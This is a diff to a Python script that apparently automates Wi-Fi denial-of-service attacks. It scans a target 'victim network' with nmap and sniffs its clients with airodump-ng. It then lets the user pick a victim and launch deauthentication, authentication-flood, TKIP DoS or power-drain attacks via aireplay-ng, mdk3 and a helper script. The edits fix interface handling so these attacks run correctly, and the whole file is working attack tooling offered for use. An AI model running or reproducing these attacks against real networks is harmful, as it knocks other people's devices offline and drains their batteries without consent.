@@ -73,13 +73,12 @@ def dump_network_info(Info):
         ips = subprocess.check_output(["grep", "inet", "-m", "1"], stdin=sp.stdout).decode()[9:26]
         # print(ips)
         sp.wait()
-        # TODO: Check output, log verbosely,
-        # nmap = subprocess.call(["nmap", "-n", "-A", "-oX", FILE_PREFIX+".xml", ips], stdout=subprocess.DEVNULL) # should we print nmap results to screen too?
+        nmap = subprocess.call(["nmap", "-n", "-sV", "-oX", FILE_PREFIX+".xml", ips], stdout=subprocess.DEVNULL) # should we print nmap results to screen too?
         print("Done.\n")
     else:
         print("You are not connected to " + victim_network + ".\n")
 
-    # Airodump -- working on this
+    # Airodump
     print("Enabling monitor mode... ")
     try:
         subprocess.check_output(["sudo", "airmon-ng", "start", interface])
@@ -87,7 +86,6 @@ def dump_network_info(Info):
         ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
         mon_interface = ps.communicate()[0].decode()[:-2]
         print("Starting airodump for 10 seconds... ")
-        # TODO: Not all monitor interfaces are interface+mons
         airodump = subprocess.Popen(["sudo", "airodump-ng","--bssid", ssid_dict[victim_network], mon_interface, "-w", FILE_PREFIX, "-o", "csv"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         # After 10 seconds, raise a TimeoutExpired exception to stop airodump
         o_airodump, unused_stderr = airodump.communicate(timeout=10)
@@ -101,7 +99,7 @@ def dump_network_info(Info):
         # Fixes invisible text in terminal & no echo after terminating airodump
         subprocess.call(["stty", "sane"])
 
-    info = Info(mon_interface, victim_network, ssid_dict[victim_network])
+    info = Info(interface, mon_interface, victim_network, ssid_dict[victim_network])
     return info
 
 def create_target_table():
@@ -224,25 +222,7 @@ def handle_victims_choices(clients_table, clients):
     """
     Returns a list of victims (a subset of the clients) when the user enters
     valid, comma-separted indices or enters 'A' to target all clients.
-    """
-    # victims = []
-    # while not victims:
-    #     print("\n\n\n")
-        # print(clients_table)
-    #     user_input = input("Who would you like to attack? (Separate " + "indices by commas or enter 'A' for all.) ")
-        # if user_input.lower() == "a":
-        #     victims = [client.mac for client in clients]
-        # else:
-        #     try:
-        #         victim_indices = list(map(str.strip, user_input.split(",")))
-        #         victim_indices = map(int, victim_indices)
-        #         for i in victim_indices:
-        #             victims.append(clients[i].mac)
-        #     except Exception as e:
-        #         victims = []
-        #         print("Enter a comma-separated list of numbers or 'A' for all " +
-        #                "(exception: {})".format(e))
-        
+    """ 
     # return victims
     victim = None
     while not victim:
@@ -277,13 +257,9 @@ def execute_hack(info, victim):
     except FileNotFoundError as e:
         sys.exit("No airodump results found - fatal exception: '{}'".format(e))
 
-    interface = subprocess.check_output(["nmcli", "-t", "-f", "DEVICE", "connection","show", "--active"]).decode().strip()
-
     # Set everything into monitor mode again on attack channel
-    subprocess.call(["sudo", "airmon-ng", "check", "kill"])
-    subprocess.call(["sudo", "airmon-ng", "stop", interface])
-    subprocess.call(["sudo", "airmon-ng", "start", interface, channel])
-    subprocess.call(["sudo", "iwconfig", info.interface, "channel", channel])
+    subprocess.call(["sudo", "airmon-ng", "start", info.interface, channel], stdout=subprocess.DEVNULL)
+    subprocess.call(["sudo", "iwconfig", info.mon_interface, "channel", channel], stdout=subprocess.DEVNULL)
 
     print ("Which attack would you like to launch?\n")
     print ("\nSend the kill signal to end the program! Ctrl+C")
@@ -292,20 +268,19 @@ def execute_hack(info, victim):
     if victim is not None:
         user_input = input("Enter A for AUTH DoS, D for DISASSOC DoS, P for POWER DRAIN, T for TKIP DoS: ").strip()
         if user_input.lower() == "d": # Disassociation DoS
-            subprocess.call(["sudo", "aireplay-ng", "-0", "0", "-a", info.bssid, "-c", victim, "-e", info.ssid, info.interface])
+            subprocess.call(["sudo", "aireplay-ng", "-0", "0", "-a", info.bssid, "-c", victim, "-e", info.ssid, info.mon_interface])
         elif user_input.lower() == "p": # Power Drain
-            subprocess.call(["sudo", "python", "psdos.py", info.interface, victim, info.bssid, "nullfunction"])
+            subprocess.call(["sudo", "python", "psdos.py", info.mon_interface, victim, info.bssid, "nullfunction"])
     else:
         user_input = input("Enter A for AUTH DoS or T for TKIP DoS: ").strip()
         if user_input.lower() == "a": # Authentication DoS
-            subprocess.call(["sudo", "mdk3", info.interface, "a", "-a", info.bssid])
+            subprocess.call(["sudo", "mdk3", info.mon_interface, "a", "-a", info.bssid])
         elif user_input.lower() == "t": # TKIP DoS
-            subprocess.call(["sudo", "mdk3", info.interface, "m", "-t", info.bssid])
+            subprocess.call(["sudo", "mdk3", info.mon_interface, "m", "-t", info.bssid])
 
 if __name__ == "__main__":
     if sudo_user():
-        # TODO: Pass variables & arguments as needed
-        Info = namedtuple("Info", "interface ssid bssid")
+        Info = namedtuple("Info", "interface mon_interface ssid bssid")
 
         clean_old_results()
         info = dump_network_info(Info)
